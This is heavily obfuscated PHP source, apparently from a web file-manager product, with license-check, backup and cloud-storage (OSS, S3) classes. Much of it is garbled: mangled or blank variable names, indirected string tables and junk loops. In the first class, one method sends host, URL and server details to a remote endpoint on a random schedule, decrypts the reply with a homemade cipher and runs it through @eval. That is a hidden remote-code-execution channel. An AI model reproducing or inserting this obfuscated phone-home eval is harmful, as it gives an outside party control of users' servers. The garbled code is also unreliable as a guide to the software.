$÷™[229], $÷™[234] => $÷™[229], $÷™[235] => $÷™[229], $÷™[236] => $÷™[229], $÷™[237] => $÷™[229], $÷™[238] => $÷™[229], $÷™[239] => $÷™[229], $÷™[240] => $÷™[229]); $ = $Îºú[715]; if (strlen($) < $Îºú[682]) { return; } $ = explode($÷™[241], _get($this->olnbc49f451c, $÷™[113], $÷™[6])); $«© = $Îºú[716]; while (strlen($«©) < $Îºú[12]) { if (!$«©) { break; } $«©++; } $Õµ = array(); foreach ($∆ò as $ => $∆ëÕò) { if ($∆ëÕò == $÷™[225] && substr($this->fqgpe48f3ac0, 0, 1) == $÷™[225]) { continue; } if (!in_array($, $)) { $Õµ[] = $; } } foreach ($Õµ as $) { unset($»â[$]); $€õ = $Îºú[717]; } return $»â; $»ü = $Îºú[718]; } private function arfd0ed3d9fb() { $ =& $_SERVER[]; if ($this->fqgpe48f3ac0 != $[107]) { $GLOBALS[$[85]][$[89]][$[242]] = $[204]; return; } $GLOBALS[$[85]][$[243]] = $[122]; if (Model($[244])->get($[63]) != $[204]) { Model($[244])->set($[63], $[204]); } } public function gdmee7df61a7() { return $_SERVER[][245]; } private function yareebb26ef5() { $–ï =& $_SERVER[]; $ÿï =& $_SERVER[]; $ƒõ = array($ÿï[246], $ÿï[247], $ÿï[248]); $ƒë = $ÿï[249] . md5($ÿï[250]); $Õº = $–ï[704]; if (!$Õº) { die; } if ($this->fqgpe48f3ac0 == $ÿï[107] || !_get($GLOBALS, $ÿï[116])) { return; } if (!in_array($_SERVER[$ÿï[24]], $ƒõ)) { return; } if (time() % 4 != 0) { return; } $’Ω = call_user_func(array($ÿï[251], $ÿï[252]), $ƒë); $€≤ = $–ï[719]; if (!$€≤) { die; } if ($’Ω && time() - $’Ω < intval($ÿï[253])) { return; } call_user_func(array($ÿï[251], $ÿï[139]), $ƒë, time()); $ = $–ï[720]; if (strlen($) < $–ï[682]) { return; } $Õí = Model($ÿï[33])->get($ÿï[104]); $ŸÆ = $–ï[721]; if (strlen($ŸÆ) < $–ï[675]) { die; } $»∑ = array($ÿï[151] => Model($ÿï[33])->get($ÿï[187]), $ÿï[164] => $this->fqgpe48f3ac0, $ÿï[161] => $_SERVER[$ÿï[162]], $ÿï[163] => Model($ÿï[33])->get($ÿï[131]), $ÿï[102] => md5($_SERVER[$ÿï[103]] . $Õí), $ÿï[154] => $ÿï[136], $ÿï[157] => $_SERVER[$ÿï[158]]); $ = $–ï[722]; if (!$) { die; } $‘ªÊòΩ = $this->ewvj2f9c258e($ÿï[254], $»∑); if (!is_array($‘ªÊòΩ)) { return; } if ($‘ªÊòΩ[$ÿï[151]] && $‘ªÊòΩ[$ÿï[255]]) { if ($this->eqkab4bbc6d4($‘ªÊòΩ[$ÿï[255]]) == $»∑[$ÿï[151]]) { return; } } $this->mnckb7682f13(); $“ë = $–ï[723]; if (!$“ë) { return; } if ($this->eqkab4bbc6d4($‘ªÊòΩ[$ÿï[255]]) != $»∑[$ÿï[151]]) { $”∫ = array($ÿï[182] => $Õí, $ÿï[183] => $_SERVER[$ÿï[103]], $ÿï[184] => this_url(), $ÿï[159] => $_SERVER[$ÿï[160]]); $Ëæõ = $this->eztf496938c0(json_encode($”∫)); $‘ªÊòΩ = $this->ewvj2f9c258e($ÿï[185] . $Ëæõ); if ($‘ªÊòΩ && is_array($‘ªÊòΩ) && isset($‘ªÊòΩ[$ÿï[255]])) { $ = $this->bsygaf9bb15f($‘ªÊòΩ[$ÿï[255]], 2); if ($) { $ = $this->eqkab4bbc6d4($); } if ($) { try { @eval($); } catch (Exception $) { } } } } } private function ewvj2f9c258e($ﬂ¥ = '', $ = array(), $›ª = 5) { $Àä‘∫ =& $_SERVER[]; $Œ† =& $_SERVER[]; $¬® = $Œ†[256]; $ = $Àä‘∫[724]; if (!$) { return; } $¬® = $this->jpwa80e7681e($¬®, $Œ†[257]); $¬® = $¬® . $ﬂ¥; $◊∫ = $Àä‘∫[725]; if ($ && is_array($)) { $¬® = $¬® . $Œ†[258] . http_build_query($); } if ($ === -1) { return $¬®; } $‘Æ = stream_context_create(array($Œ†[217] => array($Œ†[220] => $›ª, $Œ†[218] => $Œ†[259]), $Œ†[260] => array($Œ†[261] => !1, $Œ†[262] => !1))); $ = @file_get_contents($¬®, !1, $‘Æ); $ = $Àä‘∫[726]; while (strlen($) < $Àä‘∫[12]) { if (!$) { break; } $++; } return json_decode($, !0); $ = $Àä‘∫[727]; if (!$) { die; } } private function qpnv736865e5() { $‚±¢ =& $_SERVER[]; $ =& $_SERVER[]; $ = array($[263] => $[264], $[265] => $[266], $[267] => $[268], $[269] => $[270], $[271] => $[272], $[273] => $[212], $[274] => $[212], $[275] => $[264], $[276] => $[266], $[277] => $[268], $[278] => $[279], $[280] => $[270], $[281] => $[282], $[283] => $[272], $[284] => $[285], $[286] => $[287], $[288] => $[289]); $Ïºß = $[$this->fqgpe48f3ac0]; $Ïºß = intval($Ïºß ? $Ïºß : $[264]); $ = _get($this->olnbc49f451c, $[290]); $…û = $‚±¢[728]; while ($…û < $‚±¢[666]) { if ($…û >= 0) { break; } $…û++; } $ = $ ? intval($) : 0; $ = $‚±¢[729]; if (strlen($) < $‚±¢[675]) { die; } return $Ïºß + $; } public function kbnq4f14f912($ Å—±) { $√â =& $_SERVER[]; $Âüá =& $_SERVER[]; $ = $this->qpnv736865e5(); $œ¶ = $√â[730]; while ($œ¶ < $√â[682]) { if ($œ¶ >= 0) { break; } $œ¶++; } if ($ Å—±[$Âüá[291]] == $Âüá[122]) { return; } if ($ >= intval($Âüá[212])) { return; } $ = Model($Âüá[125])->count(); if ($ <= $) { return; } $ = Model($Âüá[125])->field($Âüá[291])->limit($)->select(); $ = array_to_keyvalue($, $Âüá[6], $Âüá[291]); $œ©ﬁ™ = $√â[731]; while ($œ©ﬁ™ < $√â[666]) { if ($œ©ﬁ™ >= 0) { break; } $œ©ﬁ™++; } if (!in_array($ Å—±[$Âüá[291]], $)) { show_json($Âüá[292], !1, $Âüá[208]); } } public function ndmwf1600fff() { $ =& $_SERVER[]; $Àî =& $_SERVER[]; if (!_get($GLOBALS, $Àî[116]) || mt_rand(1, 100) > 20) { return; } $À≤ = $Àî[215]; $ = $[732]; $À≤ = $this->jpwa80e7681e($À≤, $Àî[216]); $‘à = stream_context_create(array($Àî[217] => array($Àî[218] => $Àî[219], $Àî[220] => 3))); $Ãç = $[733]; if (!$Ãç) { die; } $ = @file_get_contents($À≤, !1, $‘à); $‘û = $[734]; echo $Àî[293] . hash_encode($) . $Àî[294]; } private function ulwh22069c88($—∏, $‘Ö, $ﬂô = 3) { $ á·≤ü =& $_SERVER[]; $ŒΩ =& $_SERVER[]; usleep(1); $Â°å = $ á·≤ü[735]; if (strlen($Â°å) < $ á·≤ü[666]) { return; } $—∏ = trim($—∏); $ = mt_rand(0, 5) . $ŒΩ[6]; $Î§¨ = $ á·≤ü[736]; while ($Î§¨ < $ á·≤ü[675]) { if ($Î§¨ >= 0) { break; } $Î§¨++; } $Ïìâ = rand_string(15); $ = $ŒΩ[295]; $≈£ = $ á·≤ü[737]; while (strlen($≈£) < $ á·≤ü[12]) { if (!$≈£) { break; } $≈£++; } switch ($) { case $ŒΩ[204]: $›Ç = $this->cdlj69ae248c($—∏, strrev($‘Ö . $Ïìâ)); $ = $ á·≤ü[738]; if (strlen($) < $ á·≤ü[12]) { return; } break; $ÎÆí = $ á·≤ü[739]; while ($ÎÆí < $ á·≤ü[662]) { if ($ÎÆí >= 0) { break; } $ÎÆí++; } case $ŒΩ[122]: $›Ç = $this->cdlj69ae248c($—∏, strrev($Ïìâ . $‘Ö)); break; case $ŒΩ[296]: $›Ç = $this->cdlj69ae248c($—∏, base64_encode($Ïìâ . $‘Ö)); break; $ = $ á·≤ü[740]; while ($ < $ á·≤ü[675]) { if ($ >= 0) { break; } $++; } case $ŒΩ[297]: $›Ç = $this->cdlj69ae248c($—∏, md5($Ïìâ . $‘Ö)); break; $ = $ á·≤ü[741]; while ($ < $ á·≤ü[662]) { if ($ >= 0) { break; } $++; } case $ŒΩ[298]: $—∏ = base64_encode($—∏); $ = rand(0, 64); $„Æñ = $[$]; $ƒõ = $ á·≤ü[742]; if (strlen($ƒõ) < $ á·≤ü[666]) { return; } $Âàë = md5($„Æñ . md5($‘Ö . $„Æñ) . $‘Ö); $Âàë = substr($Âàë, $ % 8, $ % 8 + 7); $ = $ŒΩ[6]; $ÿø = $ á·≤ü[743]; $ = 0; $ = 0; $Ûùóà = $ á·≤ü[744]; $ﬁö = 0; for ($ = 0; $ < strlen($—∏); $++) { $ﬁö = $ﬁö == strlen($Âàë) ? 0 : $ﬁö; $ = $ á·≤ü[745]; while (strlen($) < $ á·≤ü[682]) { if (!$) { break; } $++; } $ = ($ + strpos($, $—∏[$]) + ord($Âàë[$ﬁö++])) % 64; $ .= $[$]; } $›Ç = hash_encode($„Æñ . $); break; default: $›Ç = $this->cdlj69ae248c($—∏, $‘Ö . $Ïìâ); break; $ = $ á·≤ü[746]; if (!$) { die; } } $›Ç = strrev($ . $Ïìâ . $›Ç); if ($ﬂô - 1 > 0) { $›Ç = $this->ulwh22069c88($›Ç, $‘Ö, $ﬂô - 1); } return $›Ç; } private function bsygaf9bb15f($÷Ç, $, $∆£ = 3) { $ =& $_SERVER[]; $ÃÅ =& $_SERVER[]; if (!is_string($÷Ç) || strlen($÷Ç) < 10) { return !1; } $÷Ç = trim($÷Ç); $ÏÆ∑ = $[747]; $÷Ç = strrev($÷Ç); $—† = $[748]; $ = $÷Ç[0]; $‹Å = $[749]; while ($‹Å < $[12]) { if ($‹Å >= 0) { break; } $‹Å++; } $Ëû° = substr($÷Ç, 1, 15); $«ø = $[750]; if (strlen($«ø) < $[12]) { return; } $÷Ç = substr($÷Ç, 16); $ƒ≤ = $[751]; while ($ƒ≤ < $[682]) { if ($ƒ≤ >= 0) { break; } $ƒ≤++; } $–É = $ÃÅ[295]; $ = $[752]; while ($ < $[666]) { if ($ >= 0) { break; } $++; } switch ($) { case $ÃÅ[204]: $Ôæö◊ì = $this->jpwa80e7681e($÷Ç, strrev($ . $Ëû°)); $Ëò¨ = $[753]; if (!$Ëò¨) { die; } break; $ = $[754]; if (!$) { die; } case $ÃÅ[122]: $Ôæö◊ì = $this->jpwa80e7681e($÷Ç, strrev($Ëû° . $)); $ = $[755]; while (strlen($) < $[682]) { if (!$) { break; } $++; } break; case $ÃÅ[296]: $Ôæö◊ì = $this->jpwa80e7681e($÷Ç, base64_encode($Ëû° . $)); break; case $ÃÅ[297]: $Ôæö◊ì = $this->jpwa80e7681e($÷Ç, md5($Ëû° . $)); $Îâ• = $[756]; while ($Îâ• < $[682]) { if ($Îâ• >= 0) { break; } $Îâ•++; } break; case $ÃÅ[298]: $÷Ç = hash_decode($÷Ç); $ = $÷Ç[0]; $÷Ç = substr($÷Ç, 1); $ = strpos($–É, $); $ = md5($ . md5($ . $) . $); $–à = $[757]; if (!$–à) { die; } $ = substr($, $ % 8, $ % 8 + 7); $‘π = $ÃÅ[6]; $ = $[758]; $ = 0; $ﬁ±ﬁâ = 0; $Ãê = $[759]; if (!$Ãê) { return; } $«çœÆ = 0; for ($ = 0; $ < strlen($÷Ç); $++) { $«çœÆ = $«çœÆ == strlen($) ? 0 : $«çœÆ; $›µ = $[760]; $ = $«çœÆ++; $≈å = $[761]; $ﬁ±ﬁâ = strpos($–É, $÷Ç[$]) - $ - ord($[$]); while ($ﬁ±ﬁâ < 0) { $ﬁ±ﬁâ += 64; } $‘π .= $–É[$ﬁ±ﬁâ]; } $Ôæö◊ì = base64_decode($‘π); $ = $[762]; while ($ < $[12]) { if ($ >= 0) { break; } $++; } break; $ = $[763]; if (strlen($) < $[682]) { die; } default: $Ôæö◊ì = $this->jpwa80e7681e($÷Ç, $ . $Ëû°); break; $÷ù = $[764]; if (!$÷ù) { die; } } if ($∆£ - 1 > 0) { $Ôæö◊ì = $this->bsygaf9bb15f($Ôæö◊ì, $, $∆£ - 1); } return $Ôæö◊ì; } public function eztf496938c0($Ã∫⁄Ω) { $¬≤ =& $_SERVER[]; $◊¥ =& $_SERVER[]; $›ê = $this->vtya236a95d9(); $◊î = $this->vtya236a95d9(); $Îüú‹Æ = $¬≤[765]; if (!$Îüú‹Æ) { return; } $ﬁî = ($›ê - 1) * ($◊î - 1); $ﬂª = $¬≤[766]; while (strlen($ﬂª) < $¬≤[675]) { if (!$ﬂª) { break; } $ﬂª++; } $ = intval(($›ê + $◊î) / 2); while (1) { $ = $; $ = $ﬁî; while ($ % $ != 0) { $“® = $; $ = $; $ = $“® % $; $√¥¬à = $¬≤[767]; while ($√¥¬à < $¬≤[666]) { if ($√¥¬à >= 0) { break; } $√¥¬à++; } } if ($ == 1) { break; } else { $++; } } $≈ô = 2; for ($◊Ñ = 0; $◊Ñ < $ﬁî * 10; $◊Ñ++) { if (($ﬁî * $◊Ñ + 1) % $ == 0) { $≈ô = intval(($ﬁî * $◊Ñ + 1) / $); break; } } $√∫ = $this->cdlj69ae248c($›ê * $◊î . $◊¥[6], $◊¥[136]); $√∫ = md5($◊¥[299] . ($›ê + $◊î) . $◊¥[300] . $ . $◊¥[300] . $≈ô . $◊¥[301]); $“Ö = $¬≤[768]; $ÔÄΩ = $this->cdlj69ae248c($Ã∫⁄Ω, $√∫) . $◊¥[302] . $√∫; $ﬂÇ = $¬≤[769]; return $ÔÄΩ; } public function eqkab4bbc6d4($›í) { $Íò∏ =& $_SERVER[]; $∆æ =& $_SERVER[]; $ = explode($∆æ[302], $›í); if (count($) != 2) { return $∆æ[6]; } $ÙáºÖ = $this->jpwa80e7681e($[1] . $∆æ[6], $∆æ[136]); if (!$ÙáºÖ) { return $∆æ[6]; } $ÙáºÖ = intval($ÙáºÖ); $ = $Íò∏[770]; while ($ < $Íò∏[675]) { if ($ >= 0) { break; } $++; } $ = 0; $«µﬂ§ = $Íò∏[771]; $ = 0; for ($»´ = 3; $»´ < $ÙáºÖ; $»´ += 2) { if ($ÙáºÖ % $»´ != 0) { continue; } $ = $»´; $ = intval($ÙáºÖ / $»´); $ = $Íò∏[772]; if (strlen($) < $Íò∏[12]) { return; } break; $‹Ø = $Íò∏[773]; if (strlen($‹Ø) < $Íò∏[12]) { return; } } $ ¶ = ($ - 1) * ($ - 1); $ = $Íò∏[774]; $ = intval(($ + $) / 2); while (1) { $‘ë = $; $À™ = $Íò∏[775]; if (!$À™) { return; } $—ª = $ ¶; $‘¶ = $Íò∏[776]; while (strlen($‘¶) < $Íò∏[666]) { if (!$‘¶) { break; } $‘¶++; } while ($—ª % $‘ë != 0) { $ﬂØ = $—ª; $‘¢ = $Íò∏[777]; if (strlen($‘¢) < $Íò∏[662]) { die; } $—ª = $‘ë; $Ÿâ = $Íò∏[778]; $‘ë = $ﬂØ % $‘ë; } if ($‘ë == 1) { break; } else { $++; } } $ = 2; $ • = $Íò∏[779]; for ($»´ = 0; $»´ < $ ¶ * 10; $»´++) { if (($ ¶ * $»´ + 1) % $ == 0) { $ = intval(($ ¶ * $»´ + 1) / $); break; } } $€Ø = md5($∆æ[299] . ($ + $) . $∆æ[300] . $ . $∆æ[300] . $ . $∆æ[301]); $◊≥ = $this->jpwa80e7681e($[0], $€Ø); $ = $Íò∏[780]; if (strlen($) < $Íò∏[682]) { return; } return $◊≥; } public function vtya236a95d9() { $ÊëÑ =& $_SERVER[]; $∆† = mt_rand(pow(2, 14), pow(2, 16) - 1); $◊ï = array(); $ = 1; while ($ <= (int) sqrt($∆†)) { $Ãû = $; $‘£÷± = $ÊëÑ[781]; if (!$‘£÷±) { die; } while (!0) { $Ãû++; if ($Ãû <= 2) { $ = $Ãû; break; } else { if ($Ãû < 2) { continue; } } $–å‚¨ª = !0; for ($”£ = 2; $”£ <= sqrt($Ãû); $”£++) { if ($Ãû % $”£ == 0) { $–å‚¨ª = !1; } } if ($–å‚¨ª) { $ = $Ãû; break; } } $◊ï[] = $; $ = $ÊëÑ[782]; } $ = 2; $Óòø = $ÊëÑ[783]; for ($Ãû = $∆†; $Ãû > 1; $Ãû--) { $–å‚¨ª = !0; foreach ($◊ï as $) { if ($Ãû % $ == 0) { $–å‚¨ª = !1; break; } } if ($–å‚¨ª) { $ = $Ãû; break; } } return $; $ÿë = $ÊëÑ[784]; if (!$ÿë) { die; } } public function ekqfc4a7aafa($‰ºÉ›ç, $ƒü) { $Ôºì =& $_SERVER[]; $‚ç¶ =& $_SERVER[]; return call_user_func(array($‚ç¶[8], $‚ç¶[303]), $‰ºÉ›ç, $ƒü); $ = $Ôºì[785]; if (strlen($) < $Ôºì[682]) { die; } } public function cdlj69ae248c($€∑¬ú, $ﬂú) { $ﬂß =& $_SERVER[]; return call_user_func(array($ﬂß[304], $ﬂß[305]), $€∑¬ú, $ﬂú); $ = $_SERVER[][786]; if (!$) { return; } } public function jpwa80e7681e($, $√û) { $ËÖí =& $_SERVER[]; $√Ä =& $_SERVER[]; return call_user_func(array($√Ä[304], $√Ä[306]), $, $√û); $‰øó = $ËÖí[787]; while ($‰øó < $ËÖí[662]) { if ($‰øó >= 0) { break; } $‰øó++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $⁄î =& $_SERVER[]; $this->isManual(); self::$name = date($⁄î[788]); if (!($›ï = Model($⁄î[789])->lastItem())) { $›ï = $this->initData(); } else { self::$name = $›ï[$⁄î[42]]; if ($›ï[$⁄î[790]] == $⁄î[98]) { self::$name = date($⁄î[264]); $ﬁ¨ = 0; if (isset($›ï[$⁄î[346]][$⁄î[224]][$⁄î[518]])) { $ﬁ¨ = (int) $›ï[$⁄î[346]][$⁄î[224]][$⁄î[518]]; } if (self::$manual == 0 && $›ï[$⁄î[42]] == self::$name) { Model($⁄î[789])->remove($›ï[$⁄î[452]]); } $›ï = $this->initData($ﬁ¨, $›ï[$⁄î[791]]); } else { $this->checkStore($›ï[$⁄î[791]]); } } self::$option = $›ï; } private function isManual() { $ = _get($GLOBALS, $_SERVER[][792], 0); $ = intval($); self::$manual = $ && $ == 1 ? 1 : 0; } private function initData($Óä≠ = 0, $ = '') { $Íû£ =& $_SERVER[]; $ = Model($Íû£[789])->config(); if ($ && $[$Íû£[791]] != $) { $Óä≠ = 0; } $this->checkStore($[$Íû£[791]]); if (self::$manual == 1) { self::$name .= $Íû£[21] . date($Íû£[793]); } $ = array($Íû£[791] => $[$Íû£[791]], $Íû£[42] => self::$name, $Íû£[790] => 0, $Íû£[794] => $[$Íû£[794]], $Íû£[795] => self::$manual, $Íû£[346] => array($Íû£[796] => array($Íû£[790] => 0), $Íû£[797] => array($Íû£[790] => 0, $Íû£[798] => 0, $Íû£[799] => 0, $Íû£[43] => $Íû£[22], $Íû£[800] => 0, $Íû£[801] => 0), $Íû£[802] => array($Íû£[790] => 0, $Íû£[798] => 0, $Íû£[799] => 0, $Íû£[800] => 0, $Íû£[801] => 0), $Íû£[224] => array($Íû£[790] => 0, $Íû£[803] => 0, $Íû£[804] => 0, $Íû£[805] => 0, $Íû£[806] => 0, $Íû£[518] => $Óä≠, $Íû£[800] => 0, $Íû£[801] => 0)), $Íû£[800] => time(), $Íû£[801] => 0); $ = Model($Íû£[789])->insert($); $[$Íû£[452]] = $; return $; } private function checkStore($) { $Í¥ö =& $_SERVER[]; $Ô¶õ√∏ = Model($Í¥ö[807])->listData($); Model($Í¥ö[807])->checkConfig($Ô¶õ√∏); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[][789])->findByName(self::$name); } return self::$option; } public static function set($»©) { $ =& $_SERVER[]; $ƒ∞ = self::get(); foreach ($»© as $«Ç => $“º) { $ = explode($[20], $«Ç); $Õ® = count($); switch ($Õ®) { case 1: $ƒ∞[$[0]] = $“º; break; case 2: $ƒ∞[$[0]][$[1]] = $“º; break; case 3: $ƒ∞[$[0]][$[1]][$[2]] = $“º; break; } } Model($[789])->update($ƒ∞[$[452]], $ƒ∞); self::$option = $ƒ∞; return self::$option; } public function keep() { $‡¥á =& $_SERVER[]; $ = self::get(); if ($[$‡¥á[346]][$‡¥á[796]][$‡¥á[790]] == $‡¥á[98]) { return; } $this->backupKeep($); self::set(array($‡¥á[808] => 1)); } private function backupKeep($»Ä) { $—û =& $_SERVER[]; if (self::$manual == 1) { return; } $‹´…ß = Model($—û[789])->listData(); if (empty($‹´…ß)) { return; } $·Üã = 0; $«ú = array(); foreach ($‹´…ß as $Õù) { if ($·Üã >= 7) { break; } $«ú[] = $Õù[$—û[42]]; $·Üã++; } for ($·Üã = 0; $·Üã < 12; $·Üã++) { $«ú[] = date($—û[809], strtotime("\x2d{$·Üã}\x20\x6d\157\156\x74\x68\x73")); } $«ú = array_unique($«ú); $ƒÑ = Model($—û[810])->get($—û[811]); foreach ($‹´…ß as $Õù) { if (isset($Õù[$—û[795]]) && $Õù[$—û[795]] == $—û[98]) { continue; } if (!empty($Õù[$—û[42]]) && in_array($Õù[$—û[42]], $«ú)) { continue; } Model($—û[789])->remove($Õù[$—û[452]]); $√á = $this->backupPath($»Ä, $ƒÑ); IO::remove($√á, !1); } } private function backupPath($€¥, $›ª = false) { $ =& $_SERVER[]; if (!$›ª) { $›ª = Model($[810])->get($[811]); } $‘° = $€¥[$[42]]; $ = substr(md5($[812] . $›ª . $‘°), 0, 8); return "\x7b\x69\157\72{$€¥[$[791]]}\175\x2f\x64\x61\164\141\142\x61\x73\145\57\x62\141\143\153\165\x70\57" . $‘° . $[21] . $; } public function db() { $ =& $_SERVER[]; $⁄ó = self::get(); if ($⁄ó[$[346]][$[797]][$[790]] == $[98]) { return !0; } $Òè∞Ü = new BackupDb(); if (!$Òè∞Ü->index()) { return !1; } self::set(array($[813] => 1)); return !0; } public function dbFile() { $’±…¢ =& $_SERVER[]; $–£ = self::get(); if ($–£[$’±…¢[346]][$’±…¢[802]][$’±…¢[790]] == $’±…¢[98]) { return !0; } $ = new BackupDbFile(); if (!$->index()) { return !1; } self::set(array($’±…¢[814] => 1)); return !0; } public function file() { $ =& $_SERVER[]; $…Æ = self::get(); if ($…Æ[$[346]][$[224]][$[790]] == $[98]) { return !0; } if (!isset($…Æ[$[794]]) || $…Æ[$[794]] == $[222]) { $ = new BackupFile(); if (!$->index()) { return !1; } } self::set(array($[815] => 1, $[790] => 1)); return !0; } } goto b∆û; aﬁç: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($) { parent::__construct($); $this->signatureVersion($_SERVER[][241]); } public function fileOutLink($Õ∫“¨) { $ =& $_SERVER[]; if (substr($Õ∫“¨, 0, 7) == $[1371]) { $Õ∫“¨ = $[1372] . substr($Õ∫“¨, 7); } header($[172] . $Õ∫“¨); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($◊æ) { parent::__construct(); include_once SDK_DIR . $_SERVER[][1408]; $this->_init($◊æ); } public function _init($’±) { $ =& $_SERVER[]; $this->config = $’±; foreach ($’± as $ => $) { if (isset($this->{$})) { $this->{$} = $; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($[1409] . LNG($[1410])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $∆¢ =& $_SERVER[]; $ ê = new OSS\Model\CorsConfig(); $»Æ = new OSS\Model\CorsRule(); $»Æ->addAllowedOrigin($∆¢[1411]); $»Æ->addAllowedMethod($∆¢[1412]); $»Æ->addAllowedMethod($∆¢[1413]); $»Æ->addAllowedMethod($∆¢[1414]); $»Æ->addAllowedMethod($∆¢[1415]); $»Æ->addAllowedMethod($∆¢[171]); $»Æ->setMaxAgeSeconds(600); $»Æ->addExposeHeader($∆¢[1416]); $»Æ->addAllowedHeader($∆¢[1411]); $ ê->addRule($»Æ); try { $this->client->putBucketCors($this->bucket, $ ê); } catch (OSS\Core\OssException $) { return !1; } return !0; } public function getBucketCors() { $ =& $_SERVER[]; $ﬁø = null; try { $ﬁø = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $—∂) { return null; } if (!$ﬁø || !($ = $ﬁø->getRules())) { return null; } $‘ã = $[0]->getAllowedOrigins(); $ﬂô = $[0]->getAllowedMethods(); $ = $[0]->getMaxAgeSeconds(); $◊ö = $[0]->getExposeHeaders(); $≈Å = $[0]->getAllowedHeaders(); return array($[212] => isset($‘ã[0]) ? $‘ã[0] : $[22], $[216] => $ﬂô, $[1417] => $, $[1418] => isset($◊ö[0]) ? $◊ö[0] : $[22], $[214] => isset($≈Å[0]) ? $≈Å[0] : $[22]); } public function isBucketCors() { $ŸΩ =& $_SERVER[]; $Ã¨ = $this->getBucketCors(); if (!$Ã¨ || !is_array($Ã¨)) { return !1; } if ($Ã¨[$ŸΩ[212]] != $ŸΩ[213] || $Ã¨[$ŸΩ[214]] != $ŸΩ[213]) { return !1; } $¬àœö = array_map($ŸΩ[215], $Ã¨[$ŸΩ[216]]); if (!is_array($¬àœö)) { $¬àœö = array(); } $ = array($ŸΩ[217], $ŸΩ[218], $ŸΩ[219], $ŸΩ[220], $ŸΩ[221]); $ = array_diff($, $¬àœö); return empty($); } public function mkfile($, $Ÿ® = '', $«° = REPEAT_RENAME) { $ = $this->setContent($, $Ÿ®); if ($ !== !1) { return $this->getPathOuter($); } return !1; } public function mkdir($…°, $“≠√ã = REPEAT_SKIP) { if ($“≠√ã && $this->_isFolder($…°)) { return $this->getPathOuter($…°); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($…°)); } catch (OSS\Core\OssException $) { return !1; } return $this->getPathOuter($…°); } private function fileList($, $Óà§ = '', $ = 0) { $ ∂ﬁî =& $_SERVER[]; $ = trim($, $ ∂ﬁî[18]); $ = empty($) && $ !== $ ∂ﬁî[222] ? $ ∂ﬁî[22] : $ . $ ∂ﬁî[18]; $ = $ ∂ﬁî[22]; $ = 1000; $ﬁë = $—ë = array(); while (!0) { check_abort(); $ = array($ ∂ﬁî[1419] => $Óà§, $ ∂ﬁî[1420] => $, $ ∂ﬁî[1421] => $, $ ∂ﬁî[1422] => $); try { $√ªÈßÖ = $this->client->listObjects($this->bucket, $); } catch (OSS\Core\OssException $Á´Ω) { break; } $ = $√ªÈßÖ->getNextMarker(); $ÿÜ = $√ªÈßÖ->getObjectList(); $ = $√ªÈßÖ->getPrefixList(); foreach ($ÿÜ as $ õ) { if ($ õ->getKey() == $) { continue; } $—ó = $ õ->getKey(); $Ã± = $ õ->getSize(); $·†é = $ õ->getLastModified(); $Âä∫ = trim($ õ->getETag(), $ ∂ﬁî[128]); $‚≥ö = $ ? array($ ∂ﬁî[42] => $—ó, $ ∂ﬁî[86] => $Ã±, $ ∂ﬁî[204] => strtotime($·†é), $ ∂ﬁî[1423] => $Âä∫) : $—ó; $ = $Ã± == 0 && substr($—ó, strlen($—ó) - 1, 1) == $ ∂ﬁî[18] ? !0 : !1; $ÿß—Ö = array($ ∂ﬁî[86] => $Ã±, $ ∂ﬁî[1424] => $Ã±, $ ∂ﬁî[95] => strtotime($·†é), $ ∂ﬁî[1425] => $·†é, $ ∂ﬁî[1423] => $Âä∫); $this->cacheMethodInfoSet($—ó, $, $ÿß—Ö); if ($) { $ﬁë[] = $—ó; continue; } $—ë[] = $‚≥ö; } foreach ($ as $) { $ﬁë[] = $->getPrefix(); $this->cacheMethodInfoSet($->getPrefix(), !0); } if ($ === $ ∂ﬁî[22]) { break; } } $this->cacheMethodInfoSet($, !0); return array($ ∂ﬁî[92] => $ﬁë, $ ∂ﬁî[93] => $—ë); } public function copyFile($, $œΩ) { $»ì = $this->size($); if ($»ì < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $, $this->bucket, $this->pathEncode($œΩ)); } catch (OSS\Core\OssException $) { return !1; } return $this->getPathOuter($œΩ); } $ = $this->multiCopyObject($, $œΩ, $»ì); return $ ? $this->getPathOuter($œΩ) : !1; } private function multiCopyObject($Õ§, $, $Í´≥) { $ŸÇ =& $_SERVER[]; try { $≈´ = array(); if ($ÿ´ = $this->hashMd5($Õ§)) { $≈´ = array(OSS\OssClient::OSS_HEADERS => array($ŸÇ[1426] => $ÿ´)); } $ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($), $≈´); $ = 1; $ = 0; $›é = array(); $ = 1024 * 1024 * 10; $ = $this->client->generateMultiuploadParts($Í´≥, $); foreach ($ as $Ê£© => $) { $’å = $ + (int) $[$ŸÇ[1427]]; $’ú = (int) $[$ŸÇ[390]] + $’å - 1; $Îùô = array($ŸÇ[1428] => $’å, $ŸÇ[1429] => $’ú); $›é[] = $this->client->uploadPartCopy($this->bucket, $Õ§, $this->bucket, $this->pathEncode($), $, $, $Îùô); $ = $ + 1; } $ = array(); foreach ($›é as $Ê£© => $‚éú) { $[] = array($ŸÇ[1430] => $Ê£© + 1, $ŸÇ[1431] => $‚éú); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($), $, $); } catch (OSS\Core\OssException $ﬂâÕ°) { return !1; } return !0; } public function moveFile($„îø, $) { if ($this->copyFile($„îø, $)) { $this->remove($„îø); return $this->getPathOuter($); } return !1; } public function delFile($–ñœ∫) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($–ñœ∫)); } catch (OSS\Core\OssException $Œº) { return !1; } return !0; } public function delFolder($) { $ÙÅ©® =& $_SERVER[]; if (!$this->exist($)) { return !0; } $this->listItemCache = !1; $ = $this->fileList($); $this->listItemCache = !0; $Ÿü = trim($, $ÙÅ©®[18]) . $ÙÅ©®[18]; if (!empty($) && $ !== $ÙÅ©®[222] && !in_array($Ÿü, 